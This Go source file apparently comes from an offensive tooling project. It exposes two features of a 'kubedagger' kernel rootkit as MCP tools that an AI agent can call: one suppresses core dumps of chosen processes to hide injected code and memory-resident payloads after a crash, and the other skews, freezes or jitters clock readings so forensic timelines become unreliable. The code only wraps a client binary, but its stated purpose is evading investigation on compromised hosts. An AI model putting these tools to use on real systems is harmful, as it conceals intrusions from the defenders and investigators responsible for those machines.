package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

// Coredump Suppress

type CoredumpSuppressInput struct {
	Pids string `json:"pids,omitempty"`
}

type CoredumpSuppressTool struct {
	exec executor.Executor
}

func NewCoredumpSuppress(exec executor.Executor) *CoredumpSuppressTool {
	return &CoredumpSuppressTool{exec: exec}
}

func (t *CoredumpSuppressTool) Name() string { return "kubedagger_coredump_suppress" }

func (t *CoredumpSuppressTool) Description() string {
	return "Suppress core dump generation for specific processes by hooking do_coredump. Prevents crash analysis from revealing injected code or memory-resident payloads when a compromised process crashes."
}

func (t *CoredumpSuppressTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"pids": {
				"type": "string",
				"description": "Comma-separated list of target process IDs (e.g. '1234,5678')"
			}
		}
	}`)
}

func (t *CoredumpSuppressTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input CoredumpSuppressInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validatePIDList(input.Pids); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"coredump-suppress"}
	if input.Pids != "" {
		args = append(args, "--pids", input.Pids)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger coredump-suppress failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger Coredump Suppress\n\n")
	if output == "" {
		sb.WriteString("Suppression active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}

// Timeskew

type TimeskewInput struct {
	Pids   string `json:"pids,omitempty"`
	Offset string `json:"offset,omitempty"`
	Mode   string `json:"mode,omitempty"`
}

type TimeskewTool struct {
	exec executor.Executor
}

func NewTimeskew(exec executor.Executor) *TimeskewTool {
	return &TimeskewTool{exec: exec}
}

func (t *TimeskewTool) Name() string { return "kubedagger_timeskew" }

func (t *TimeskewTool) Description() string {
	return "Manipulate time perception for specific processes by hooking clock_gettime. Makes forensic timeline analysis unreliable by shifting, freezing, or jittering timestamps observed by targeted processes."
}

func (t *TimeskewTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"pids": {
				"type": "string",
				"description": "Comma-separated list of target process IDs (e.g. '1234,5678')"
			},
			"offset": {
				"type": "string",
				"description": "Time offset in seconds (default: -3600)"
			},
			"mode": {
				"type": "string",
				"enum": ["shift", "freeze", "jitter"],
				"description": "Timeskew mode (default: shift)"
			}
		}
	}`)
}

func (t *TimeskewTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input TimeskewInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validatePIDList(input.Pids); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Offset, "offset"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"timeskew"}
	if input.Pids != "" {
		args = append(args, "--pids", input.Pids)
	}
	if input.Offset != "" {
		args = append(args, "--offset", input.Offset)
	}
	if input.Mode != "" {
		args = append(args, "--mode", input.Mode)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger timeskew failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger Timeskew\n\n")
	if output == "" {
		sb.WriteString("Timeskew active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
